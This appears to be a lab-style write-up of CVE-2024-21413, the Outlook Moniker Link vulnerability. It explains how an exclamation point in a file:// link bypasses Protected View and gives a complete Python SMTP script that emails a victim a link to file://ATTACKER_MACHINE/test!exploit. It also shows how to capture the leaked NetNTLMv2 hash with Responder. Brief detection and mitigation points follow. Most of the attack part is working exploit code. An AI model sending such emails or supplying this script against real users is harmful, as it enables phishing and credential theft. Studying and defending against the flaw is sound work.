CVE-2024-21413
Send email containing malicious Moniker Link to victim that uses Microsoft Outlook. Victim clicks on hyperlink. NTLM credentials sent to attacker.

Moniker Link is a hyperlink that allows you to specify which application to open the link with. e.g. `skype:SkypeName?call`

Use a monitor link of type file://, which if specifying a file on a remote drive Windows will send your NTLM credentials to try to authenticate with that drive. Outlook Protected View prevents this, but it can be bypassed by adding an exclamation point in the middle of the link.
e.g.
- Instead of `file://BAD_IP/test`
- Write `file://BAD_IP/test!exploit`
Note: the share does not need to exist, Windows will try to authenticate regardless, sending the netNTLMv2 hash being sent

## Exploitation
```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Use this exploit script to send an email to the user's mail server. Setup responder to listen for events on ports `responder -I <interface>`. One of these is the SMB port (usually port 445). When the victim clicks the link you will see their NTLM credentials
## Detecting
Look for emails containing `file://` in Moniker Links
Look for NTLM hashes in payloads
## Solutions
Already patched by MS
User training - don't click on weird links
Block SMB through the firewall
Extreme case: block SMB entirely on hosts